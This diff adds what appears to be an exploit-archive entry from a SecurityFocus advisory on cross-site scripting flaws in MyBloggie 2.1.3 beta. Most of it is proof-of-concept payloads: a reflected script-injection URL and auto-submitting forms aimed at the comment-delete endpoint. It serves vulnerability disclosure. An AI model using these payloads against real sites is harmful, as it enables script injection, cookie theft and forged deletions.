@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/17048/info
+ 
+MyBloggie is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+ 
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+http://www.example.com/mybloggie213beta/index.php?mode=delcom&confirmredirect="><script>alert('xss_string')</script>
+
+<form action="http://www.example.com/mybloggie213beta/index.php?mode=delcom&comment_id=1&redirect=adm&confirm=yes" method="post">
+<input type="text" name="post_id" value='">xss_string' />
+<input type="submit"/>
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
+
+<form action="http://www.example.com/mybloggie213beta/index.php?mode=delcom&comment_id=1" method="post">
+<input type="text" name="post_id" value='">xss_string' />
+<input type="submit"/>
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
